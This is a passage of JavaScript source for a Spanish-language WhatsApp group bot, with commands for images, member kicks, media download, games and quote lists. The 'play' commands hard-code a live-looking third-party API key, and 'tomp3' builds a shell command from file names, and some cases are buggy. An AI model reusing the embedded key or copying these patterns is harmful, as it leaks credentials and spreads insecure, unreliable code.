const vu =['https://i.ibb.co/8jMFJLS/22.jpg','https://i.ibb.co/pbJknt8/21.jpg','https://i.ibb.co/3frJKPK/20.jpg','https://i.ibb.co/WgkfC3Q/63.jpg','https://i.ibb.co/zF0fqgC/29.jpg','https://i.ibb.co/KXYsk9C/62.jpg','https://i.ibb.co/jfvgcyH/28.jpg','https://i.ibb.co/9wL1fcL/61.jpg','https://i.ibb.co/7yyB3vZ/27.jpg','https://i.ibb.co/XSJTTj5/60.jpg','https://i.ibb.co/Y0zdDjr/26.jpg','https://i.ibb.co/m9RKKr8/25.jpg','https://i.ibb.co/Gnpwyw5/24.jpg','https://i.ibb.co/vJtTs6d/23.jpg','https://i.ibb.co/TKxmb60/9.jpg','https://i.ibb.co/4Y4xVXB/55.jpg','https://i.ibb.co/Y8Z3S4W/11.jpg','https://i.ibb.co/JFkNn6M/54.jpg','https://i.ibb.co/1bxFC4R/10.jpg','https://i.ibb.co/KNWqBFz/53.jpg','https://i.ibb.co/Jpbynx5/52.jpg','https://i.ibb.co/kcWPjhf/51.jpg','https://i.ibb.co/qrVHF8H/50.jpg','https://i.ibb.co/m9ywdqR/19.jpg','https://i.ibb.co/27JC0mY/18.jpg','https://i.ibb.co/9wzz02R/17.jpg','https://i.ibb.co/sj5bDQ9/16.jpg','https://i.ibb.co/4PpYwMp/59.jpg','https://i.ibb.co/yR686k4/15.jpg','https://i.ibb.co/t4HtmB9/58.jpg','https://i.ibb.co/yBCTWg4/14.jpg','https://i.ibb.co/qyD03cF/57.jpg','https://i.ibb.co/NxMy58Z/13.jpg','https://i.ibb.co/QrHwdPZ/56.jpg','https://i.ibb.co/PG8BK52/12.jpg','https://i.ibb.co/BP0tCsG/44.jpg','https://i.ibb.co/2vsGNB5/43.jpg','https://i.ibb.co/6wnNL3f/42.jpg','https://i.ibb.co/cQ41fW1/41.jpg','https://i.ibb.co/FHhsw0z/40.jpg','https://i.ibb.co/NrXpDSn/8.jpg','https://i.ibb.co/h9cT0ZJ/7.jpg','https://i.ibb.co/PT56Dqq/6.jpg','https://i.ibb.co/dkW7ZG8/49.jpg','https://i.ibb.co/wMMN45z/5.jpg','https://i.ibb.co/nnyG8zL/48.jpg','https://i.ibb.co/RPmtr7L/4.jpg','https://i.ibb.co/SnPPfXQ/47.jpg','https://i.ibb.co/JyY7rhP/3.jpg','https://i.ibb.co/w769bF3/46.jpg','https://i.ibb.co/FW1r8JJ/2.jpg','https://i.ibb.co/7WChLwT/45.jpg','https://i.ibb.co/fpc7vrg/1.jpg','https://i.ibb.co/JtTCzqt/69.jpg','https://i.ibb.co/FsPkRQy/68.jpg','https://i.ibb.co/N2bhjmN/67.jpg','https://i.ibb.co/ctcknwP/66.jpg','https://i.ibb.co/SBD95bq/65.jpg','https://i.ibb.co/Xtn32N7/64.jpg','https://i.ibb.co/pQ1Twkh/33.jpg','https://i.ibb.co/cYfHjHv/32.jpg','https://i.ibb.co/C2ZCRMv/31.jpg','https://i.ibb.co/sJBKymV/30.jpg','https://i.ibb.co/jL3X3vL/39.jpg','https://i.ibb.co/YjjHfwv/38.jpg','https://i.ibb.co/KsDTpy1/37.jpg','https://i.ibb.co/XDGCWLq/36.jpg','https://i.ibb.co/bs0RdwX/35.jpg','https://i.ibb.co/m5dg5KG/34.jpg']
    let vuvu = vu[Math.floor(Math.random() * vu.length)]
      kkj = await getBuffer(vuvu)
cnf.sendMessage(from, kkj, image, {quoted: mek, caption: 'Aquí tienes 💕🦈'})
addFilter(from)
          break	
	
										
					case prefix+'welcome':
					if (isBanned) return  reply(mess.banned)
                    if (!isRegistered) return reply(ind.noregis())	
                    if (!isGroupAdmins) return reply(mess.only.admin)		  
					if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('Quien eres? 7-7')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Ya activo ')
						welkom.push(from)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Activado✔️')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Desactivado✔️')
					} else {
						reply('1 para activar, 0 para desactivar')
					}
                    addFilter(from)
          break
                    
					case prefix+'add':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('quien quieres añadir??')
					if (args[0].startsWith('08')) return reply('Usa el código de país')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						cnf.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('No se pudo agregar el objetivo, tal vez porque en privado')
					}
					addFilter(from)
          break
					
			    case prefix+'kick':
			    if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())			  
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				    if (!isGroupAdmins) return reply(mess.only.admin)		
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Orden recibida, emitida :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						cnf.groupRemove(from, mentioned)
					} else {
						mentions(`Orden recibida, emitida : @${mentioned[0].split('@')[0]}`, mentioned, true)
						cnf.groupRemove(from, mentioned)
					}
					addFilter(from)
          break 
          
					case prefix+'tts':
					if (isBanned) return  reply(mess.banned)
          
if (!isRegistered) return reply(ind.noregis())			  
					if (args.length < 1) return jere.sendMessage(from, '¿Dónde está el código de idioma??', text, {quoted: mek})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return jere.sendMessage(from, 'y el texto U.U?', text, {quoted: mek})
					dtt = body.slice(7)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('El texto es muy largo T×T')
					: gtts.save(ranm, dtt, function() {
						cnf.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})
					addFilter(from)
          break
										case prefix+'online':
										  case prefix+'listonline':
										  if (isBanned) return  reply(mess.banned)
          
if (!isRegistered) return reply(ind.noregis())			  
                if (!isGroup) return reply(`[ ❗ ] Este Comando Solo Puede Ser Usado En Grupos UnU`)
                let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
                let online = [...Object.keys(cnf.chats.get(ido).presences), cnf.user.jid]
                cnf.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
                    quoted: freply,
                    contextInfo: { mentionedJid: online }
                })
                addFilter(from)
          break

					case prefix+'notif':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isGroupAdmins) return reply(mess.only.admin)					  
if (!isGroup) return reply(mess.only.group)
teks = `Notificacion Dada Por: @${sender.split("@")[0]}\n*El mensaje es: ${body.slice(7)}*`
group = await cnf.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
  jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
  text: teks,
  contextInfo: {
mentionedJid: jids
  },
  quoted: freply
}
await cnf.sendMessage(from, options, text)
addFilter(from)
          break
				
case prefix+'abrazar':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())		
	
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) return reply('etiqueta')  
const abra = ['ab1','ab2','ab3','ab4','ab5','ab6','ab7','ab8','ab9','ab10']
	const abras = abra[Math.floor(Math.random() * abra.length)]				
				result = fs.readFileSync(`./sticker/reac/abra/${abras}.mp4`)
cnf.sendMessage(from, result, video, { caption: `${pushname} está abrazando a @${mentioned[0].split('@')[0]}`})
				addFilter(from)
          break

case prefix+'patear':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())		
	
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) return reply('etiqueta')  
const pat = ['pat1','pat2','pat3','pat4','pat5']
	const pate = pat[Math.floor(Math.random() * pat.length)]				
				result = fs.readFileSync(`./sticker/reac/patad/${pate}.mp4`)
cnf.sendMessage(from, result, video, { caption: `${pushname} a pateado a @${mentioned[0].split('@')[0]}`})
				addFilter(from)
          break

case prefix+'palmaditas':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())		
	
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) return reply('etiqueta')  
const palm = ['pal1','pal2','pal3','pal4','pal5','pal6','pal7']
	const palma = palm[Math.floor(Math.random() * palm.length)]				
				result = fs.readFileSync(`./sticker/reac/palm/${palma}.mp4`)
cnf.sendMessage(from, result, video, { caption: `${pushname} le esta dando unas palmaditas a @${mentioned[0].split('@')[0]}`})
				addFilter(from)
          break

			
case prefix+'besar':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())			

mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) return reply('etiqueta')  
const bes = ['bes1','bes2','bes3','bes4','bes5','bes6','bes7']
	const beso = bes[Math.floor(Math.random() * bes.length)]				
				result = fs.readFileSync(`./sticker/reac/beso/${beso}.mp4`)
cnf.sendMessage(from, result, video, { caption: `${pushname} esta besando a @${mentioned[0].split('@')[0]}`})
				addFilter(from)
          break

				case prefix+'play':
				if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())			  
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
  if (args.length < 1) return reply('Coloca el enlace de la canción!')
  
  play = body.slice(6)
  
  anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=oCHDwj8ggZGBGjU5WIaK5Rctu6c`)
  if (anu.error) return reply(anu.error)
  infomp3 = `❒═════❬ *𝐏𝐋𝐀𝐘* ❭═════╾❒
├‣ *Nombre* : 
┴
${anu.result.title}
┬
├‣ *Fuente* : 
┴
${anu.result.source}
┬
├‣ *Tamaño* : 
┴
${anu.result.size}
┬
├‣ *Link* :
┴
*${anu.result.url_audio}
┬
❒═════════════════╾❒`
  buffer = await getBuffer(anu.result.thumbnail)
  lagu = await getBuffer(anu.result.url_audio)
  cnf.sendMessage(from, buffer, image, {
quoted: mek, caption: infomp3 })
  cnf.sendMessage(from, lagu, audio, {
mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})

  addFilter(from)
          break

case prefix+'play2':  
if (isBanned) return  reply(mess.banned) 
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)	
				  if (args.length < 1) return reply('Coloca el enlace del video!')
                cnf.sendMessage(from, mess.wait, text,{quoted : freply})
				play = args.join(" ")
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=oCHDwj8ggZGBGjU5WIaK5Rctu6c`)
				if (anu.error) return reply(anu.error)
				infomp3 = `❒════❬ *𝐏𝐋𝐀𝐘𝟐* ❭═════╾❒
├‣ *Nombre* : ${anu.result.title}
├‣ *Fuente* : ${anu.result.source}
├‣ *Tamaño* : ${anu.result.size}
❒═════════════════╾❒`			
				buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.result.url_video)
				cnf.sendMessage(from, buffer, image, {quoted: freply, caption: infomp3})
				cnf.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:freply, caption: 'Aquí tienes 💕🦈'})
					addFilter(from)
          break 
  
case prefix+'charlie':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	

if (args.length < 1) return reply('*Has tu pregunta!*')		  
const ch =['Si','No','No','Si','Si']
    const cha = ch[Math.floor(Math.random() * ch.length)]
reply(`𝐂𝐡𝐚𝐫𝐥𝐢𝐞 𝐂𝐡𝐚𝐫𝐥𝐢𝐞

𝐑𝐞𝐬𝐩𝐮𝐞𝐬𝐭𝐚 : ${cha}`)
addFilter(from)
          break

case prefix+'slot':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
const pb = ['100','50','50','50']
const pv = pb[Math.floor(Math.random() * pb.length)]
const pn = [`${pv}`]


const prd = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇'
		] 
const gnd = [
        '🍇 : 🍇 : 🍇',
	    '🍐 : 🍐 : 🍐',
		'🔔 : 🔔 : 🔔',
		'🍒 : 🍒 : 🍒',
		'🍊 : 🍊 : 🍊',
		'🍌 : 🍌 : 🍌'
		]
	const pbb = prd[Math.floor(Math.random() * prd.length)]
	const pbbn = prd[Math.floor(Math.random() * prd.length)]
	const pvv = gnd[Math.floor(Math.random() * gnd.length)]     

    if (pn < 100) return reply(`╭─╼┥𝐂𝐀𝐒𝐒𝐈𝐍𝐎┝╾─╮
╽ ┌──────────┐ ┃
        🍋 : 🍌 : 🍍
┃ ├──────────┤ ┃
        ${pbb}
┃ ├──────────┤ ┃
        ${pbbn}
╿ └──────────┘ ╿
╰──┥𝐂𝐀𝐒𝐒𝐈𝐍𝐎┠──╯

Lo siento, no has logrado alinear, buena suerte la próxima ✨`)
    cnf.sendMessage(from, `╭─╼┥𝐂𝐀𝐒𝐒𝐈𝐍𝐎┝╾─╮
╽ ┌──────────┐ ┃
        🍋 : 🍌 : 🍍
┃ ├──────────┤ ┃
        ${pvv}
┃ ├──────────┤ ┃
        ${pbbn}
╿ └──────────┘ ╿
╰──┥𝐂𝐀𝐒𝐒𝐈𝐍𝐎┠──╯    

Felicidades, has logrado ganar 500 coins`, text, { quoted: freply })
    addKoinUser(sender, 500)
                    addFilter(from)
          break

case prefix+'tomp3':
if (isBanned) return  reply(mess.banned)        
if (!isRegistered) return reply(ind.noregis())	
		  
            if (!isQuotedVideo) return fakegroup('Etiqueta un video')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await cnf.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            cnf.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            addFilter(from)
          break

case prefix+'juego':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())		
	  
	reply(`𝑷𝑰𝑬𝑫𝑹𝑨 𝑷𝑨𝑷𝑬𝑳 𝑶 ??𝑰𝑱𝑬𝑹𝑨 :

𝑷𝑨𝑹𝑨 𝑱𝑼𝑮𝑨𝑹 𝑼𝑻𝑰𝑳𝑰𝒁𝑨 𝑼𝑵𝑶 𝑫𝑬 𝑬𝑺𝑻𝑶𝑺 𝑬𝑴𝑶𝑱𝑰𝑺
		    
𝑷𝑰𝑬𝑫𝑹𝑨 : #✊
		   
𝑷𝑨𝑷𝑬𝑳 : #✋
		   
𝑻𝑰𝑱𝑬𝑹𝑨 : #✌

𝗡𝗢𝗧𝗔: en este juego no se puede ganar coins️`)
addFilter(from)
          break
		  
		   case prefix+'✊':		
		   if (isBanned) return  reply(mess.banned)   
          
if (!isRegistered) return reply(ind.noregis())			  
const piedra =[`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✋\n\n :) 𝑮𝒂𝒏𝒆 𝒉𝒖𝒎𝒂𝒏𝒐 𝒆𝒔𝒕𝒖𝒑𝒊𝒅𝒐`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✊\n\n :0 𝑬𝒎𝒑𝒂𝒕𝒆`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✌️\n\n :( 𝑮𝒂𝒏𝒂𝒔 𝒕𝒖`]
    const jg = piedra[Math.floor(Math.random() * piedra.length)]
    cnf.sendMessage(from, `𝑷𝑰𝑬𝑫𝑹𝑨 𝑷𝑨𝑷𝑬𝑳 𝑶 𝑻𝑰𝑱𝑬𝑹𝑨\n\n` + jg, text)
    addFilter(from)
          break
    
    case prefix+'✋':    
    if (isBanned) return  reply(mess.banned)
          
if (!isRegistered) return reply(ind.noregis())			  
const papel =[`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✋\n\n  :0 𝑬𝒎𝒑𝒂𝒕𝒆`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✊\n\n :( 𝑮𝒂𝒏𝒂𝒔 𝒕𝒖`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✌️\n\n :) 𝑮𝒂𝒏𝒆 𝒉𝒖𝒎𝒂𝒏𝒐 𝒆𝒔𝒕𝒖𝒑𝒊𝒅𝒐`]
    const jggg = papel[Math.floor(Math.random() * papel.length)]
    cnf.sendMessage(from, `𝑷𝑰𝑬𝑫𝑹𝑨 𝑷𝑨𝑷𝑬𝑳 𝑶 𝑻𝑰??𝑬𝑹𝑨\n\n` + jggg, text)
    addFilter(from)
          break
    
    case prefix+'✌️': 
    if (isBanned) return  reply(mess.banned)
          
if (!isRegistered) return reply(ind.noregis())			  
    const tijera =[`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✋\n\n:( 𝑮𝒂𝒏𝒂𝒔 𝒕𝒖`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✊\n\n :) 𝑮𝒂𝒏𝒆 𝒉𝒖𝒎𝒂𝒏𝒐 𝒆𝒔𝒕𝒖𝒑𝒊𝒅𝒐`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✌️\n\n:0 𝑬𝒎𝒑𝒂𝒕𝒆 `]
    const jgg = tijera[Math.floor(Math.random() * tijera.length)]
    cnf.sendMessage(from, `𝑷𝑰𝑬𝑫𝑹𝑨 𝑷𝑨𝑷𝑬𝑳 𝑶 𝑻𝑰𝑱𝑬𝑹𝑨\n\n` + jgg, text)
    addFilter(from)
          break

                case prefix+'frases': 
                if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
			  
				cnf.updatePresence(from, Presence.composing) 
				const fra =['El amor inmaduro dice: "te amo porque te necesito". El amor maduro dice: "te necesito porque te amo" (Erich Fromm)','La vida empieza cada cinco minutos (Andreu Buenafuente)','Donde las palabras fallan la música habla (Hans Christian Andersen)','Un buen viajante no tiene planes (Confucio)','Una vez aceptamos nuestros límites, vamos más allá de ello (Albert Einstein)','Lo que no nos mata nos hace más fuertes (Friedrich Nietzsche)','Si caminas solo, irás más rápido. Si caminas acompañado, llegarás más lejos.','Una vida llena de errores no solo es más honorable, sino que es más sabia que una vida gastada sin hacer nada','Es sencillo hacer que las cosas sean complicadas, pero difícil hacer que sean sencillas. F. Nietzsche','No pierdas nunca el sentido del humor y aprende a reírte de tus propios defectos','La preocupación es como una mecedora, te mantiene ocupado pero no te lleva a ninguna parte','El hombre que más ha vivido no es aquel que más años ha cumplido, sino aquel que más ha experimentado la vida','Si lo puedes soñar, lo puedes hacer','Lo imposible es el fantasma de los tímidos y el refugio de los cobardes','El camino que nos toca recorrer está lleno de sorpresas. Nunca vas a estar preparado para las que te toquen a ti, sean dichosas o sombrías, pues eso es parte de adquirir experiencia. Y descubrir cuán gratas o desafortunadas son las que te esperan, es algo nunca podrás evadir','La felicidad no es algo que pospones para el futuro, es algo que diseñas para el presente','El amigo ha de ser como el dinero, que antes de necesitarle, se sabe el valor que tiene','Tus acciones serán el reflejo de la manera que tienes de ver la vida y las que te van definir ante los demás. No las malgastes en cosas y actitudes que no valen la pena, solo tú puedes decidir la forma en la que quieres que te recuerden, porque no estarás en este mundo para siempre','El amor es lo que mueve al mundo aunque a veces parezca lo contrario. A las personas no nos haría mal recordar esto de vez en cuando','Nunca terminas de conocer a la gente. Tus amigos, tu familia y hasta tú mismo, pueden ocultar sorpresas que en la vida te podrías haber imaginado, tanto buenas como malas','Todos tenemos el mismo destino, en esencia no hay manera de diferenciarnos si nacemos para llorar y reír. Recuérdalo, todos tenemos los días contados, vive cada uno de tus días como si fueran el regalo más grande, porque nadie puede asegurarte el mañana','Mientras vivas vas a encontrarte con todo tipo de personas, tanto buenas como malas. Es imposible adivinar las intenciones que oculta alguien detrás de su comportamiento, pero descubrirlo es la tarea más interesante y peligrosa con la que te puedes llegar a topar','Los tiempos felices en la humanidad son las páginas vacías de la historia','La decepción después de un amor fallido, puede llegar a oprimir tu corazón hasta el punto de no dejarte respirar. Pero nadie se ha muerto de amor','No llores por la gente que se ha ido, enfócate en quienes se encuentran a tu lado en el presente y quédate con los buenas recuerdos de los que se marcharon','No debes enfocarte en el dolor que puedes sentir si alguien te ha falla. Si no eres capaz de perdonar una equivocación, entiérrala y sigue adelante','Amar es la aventura más grande en la que te puedes embarcar. Porque te puede hacer volar más alto de lo que jamás imaginarte y también ponerte los pies de la tierra']
 				const jys = fra[Math.floor(Math.random() * fra.length)]
			    ses = fs.readFileSync(`./media/cnf.jpeg`)
				cnf.sendMessage(from, ses, image, { caption: '*ᖴᏒᏗᏕᏋᏕ ૮ᏬᏒᎥᎧᏕᏗᏕ👌*\n\n'+ jys, quoted: mek })
              addFilter(from)
          break

case prefix+'frases2': 
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
		  
cnf.updatePresence(from, Presence.composing) 
const frs2 = [`☁️¿Alguna vez se han puesto mirar el cielo con atención?\n\n ¿Han notado que no parece real?\nParece una pintura,\nuna pintura de acuarelas💙🎨`,`💙No le digas a nadie que lo supere; ayúdale a superarlo.\n\nMuchas veces nos quedamos en el territorio del mero aliento o en el de las simples palabras de ánimo cuando, en realidad,\nlo que la otra persona necesita de ti es que te remangues y le ayudes de verdad a salir del pozo✨`,`📸Somos una generación\nde fotos felices ,y corazones tristes🎞🥀`,`🌷𝗡𝗼 𝗱𝗲𝘀𝗲𝗼 𝗾𝘂𝗲 𝗹𝗮𝘀 𝗺𝘂𝗷𝗲𝗿𝗲𝘀 𝘁𝗲𝗻𝗴𝗮𝗻 𝗺𝗮𝘀 𝗽𝗼𝗱𝗲𝗿𝗲𝘀 𝘀𝗼𝗯𝗿𝗲 𝗹𝗼𝘀 𝗵𝗼𝗺𝗯𝗿𝗲𝘀....\n\n𝗦𝗶𝗻𝗼 𝗾𝘂𝗲 𝘁𝗲𝗻𝗴𝗮𝗻 𝗺á𝘀\n𝗣𝗢𝗗𝗘𝗥 𝘀𝗼𝗯𝗿𝗲 𝘀𝗶 𝗠𝗜𝗦𝗠𝗔𝗦🤍👑`,`SI FUERA LA PRIMERA VEZ:\n\nConoces los zapatos,que llevas puesto,no es la primera vez q te los pones.Ni la segunda.Y por eso al llegar a tu casa te las quita con ayuda del otro pie,ni siquiera te preocupas si se están ensuciando.\n\nPero si fuera la primera vez q te los pones,te los quitarías delicadamente.Solo si fuera la primera vez.Ahora no.Ahora llegas después de un día agotador y lanzas en teléfono  a la cama,pero si fuera nuevo lo dejarias en la mesa,y hasta tendrías miedo a que se raye.\n\nY lo mismo pasa con las personas ,con tu pareja,con la familia.\n\nSABEMOS QUE ESTAN ALLÍ ,\n  Y dejamos de mirarlos como si fuera\n        LA PRIMERA VEZ♥️`,`🌹Las personas sensibles tienen una característica:\n\nsufren mucho más que los demás, pero también se regocijan con intensidad similar de la felicidad ajena, disfrutándola como si fuera suya.\n\nLa sensibilidad es como la facultad de ver en un mundo de ciegos♥️`,`🍎La vida es el eco, \nlo que envías es lo que regresa, \nlo que das es lo que recibes...\n\nPor eso nunca des a los demás \nlo que no quieras para ti ♥️::✨`,`Así como en la vida existe el\n" pasado, presente y futuro" ,\n\nen los sentimientos está el \n"perdona, olvida y continua"♥️`,`•💘•\n\nMás que un lavado de manos,\nel mundo necesita un lavado de\n\n                                            CORAZÒN✨`,`🎈Aprende a soltar al amor de tu vida que según tú es el correcto pero en realidad ya se volvió costumbre,\n no te idealices con una persona si no has vivido nuevas experiencias con otras, \nno te cierres y pienses que los amores que vendrán son solo a medias. \nVive, date y quiérete♥️::✨`,`⌛️El tiempo cura lo que el corazón destroza....\n\nY aun así,siguen hablando mal del tiempo y bien del amor💚::🌿`,`♻️ Yo lo llamo “Karma”...\n\nPero la biblia dice :\n\n“Cosecharás lo que Siembras”🌱💚`,`🪀Tenía la creencia de que si no te metías con nadie, nadie se metía contigo.\n\nPero no es así, \nporque hay gente a la que le molesta tu felicidad, \ntu físico, tu esencia, tus gustos, \nqué haces y que dejas de hacer✨🎍`,`💡Todo el tiempo estamos diciendo\n "El físico no importa"...\n\npero no la pasamos leyendo o viendo (películas -series) ,donde los protagonistas son de cuerpos de infarto y belleza descomunal🌿.`,`☕️El café nunca se imaginó que podría tener un sabor tan suave,\nhasta que conoció el azúcar y la leche.\n\nTodos somos buenos individualmente,\npero nos volvemos mejores cuando nos\nmezclamos con las personas apropiadas🤎🤍`,`📕Ꮮᗩ  ᗰᗩᏀᏆᗩ  ᗞᗴ  Ꮮᗴᗴᖇ ....\n\nᗴᔑᎢÁ  ᗴᑎ  ᗴᑎᑕᝪᑎᎢᖇᗩᖇ  ᖇᗴᖴᑌᏀᏆᝪ \n\n[ᗴᑎ  Ꮮᗩᔑ  ᏞᗴᎢᖇᗩᔑ  ᗞᗴ  ᝪᎢᖇᝪᔑ✍🏻♥️]`,`♥️Las mujeres son como las canciones de Arjona....\n\nsi eres paciente y las escuchas, \nte darás cuenta \nde lo perfectas que son📀✨`,`𝗘𝗹 𝗔𝗺𝗼𝗿 𝗻𝗼 𝗱𝗲𝘀𝘁𝗿𝘂𝘆𝗲 𝗮 𝗹𝗮𝘀 𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘀...\n\n𝗟𝗮𝘀 𝗽𝗲𝗿𝘀??𝗻𝗮𝘀 𝗱𝗲𝘀𝘁𝗿𝘂𝘆𝗲𝗻 𝗮 𝗹𝗮𝘀 𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘀🤍`,`🌵✨El perdón te libera de la maldad ajena,\n aunque la otra persona no se arrepienta de lo que hizo...\n\nY tú perdonas porque sabes que es lo mejor para tu salud. \nPerdonar no es necesariamente olvidar. \nQuizás lo recuerdes por siempre, \npero sin tristeza ,\n ni amargura en el corazón💚✅`,`❌Cuidado con la gente que \nte acelere el corazón  sin tocarte.\n\n\nDuele el doble \ncuando desaparecen de golpe🥀`,`Una vez alguien me dijo:\n\nSi quieres que alguien te busque, deja de buscarle. \n\nSi quieres que alguien te quiera, deja de quererle. \n\nY si quieres que alguien regrese, \ndeja de rogarle....(ironías de la vida) \n\nY ahí entendí todo🤍✨`,`🍓La vida es como una caja de Pandora:\n\n    impredecible, \n        peligrosa, \n          y \n           llena de retos mentales y físicos♥️`,`🌹☕️Recuerda: \n\nNo importa que tan buena persona seas.\nTodos somos los malos en la historia de alguien.\nAsí que disfruta tu rol ,\ny al menos se un villano memorable.`,`“Donde hay amor, hay paz” ....\n\ndijeron alguna vez los labios de alguien\nHay personas que podrían estar de acuerdo...\n\nHay personas que lo \n     encontrarían confuso💜`,`Siempre llega quien rompe todos tus miedos, \ntus inseguridades \ny hace que olvides el daño que alguna vez te hicieron, \ncon sus mimos, sus besos y abrazos, sus pequeños detalles que te alegran la vida y todo ese amor que guarda para hacerte feliz, \ny así, claro que te quedas🎆💜`,`🌹Hazlo, comete errores, \nvuelve a intentarlo, \nfalla, manda todo a la mierda,\n y empieza otra vez si es necesario. \n\n     En serio, no pasa nada🩹☺️♥️`,`Estoy cansada de escuchar que siempre digan las mismas frases de "busca a alguien que te de paz", \n"si no te da tranquilidad no es la persona indicada". \n\nQuién quiere paz?\nA quién le gustan las relaciones lineadas y monótonas que viven en un punto exacto de equilibrio, \ndonde no existen los sube y baja? \nYo realmente no podría. \nYo necesito que mi relación sea una montaña rusa de emociones, \na veces en paz, otras guerra, hoy ganas de tú, mañana gano yo, \npasado toca empatar y empezar de cero, \npero siempre sin dejar de vivir. \nSon iguales de importantes los momentos de cariño cómo los de discusión. \nPorque sino fuera por las renconciliaciones donde el amor siempre sabe mejor, \nno tendría sentido nada, \nya la vida es demasiado monótona como para que las relaciones también lo sean\n\nMi consejo:\nSi te da paz y tranquilidad...ahí no es🤎`]
  				const fras2 = frs2[Math.floor(Math.random() * frs2.length)]
			    ses = fs.readFileSync(`./media/cnf.jpeg`)
				cnf.sendMessage(from, ses, image, { caption: '*ᖴᏒᏗᏕᏋᏕ ૮ᏬᏒᎥᎧᏕᏗᏕ 2👌*\n\n'+ fras2, quoted: mek })
              addFilter(from)
          break


case prefix+'piropos':   
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
		  
				cnf.updatePresence(from, Presence.composing) 				
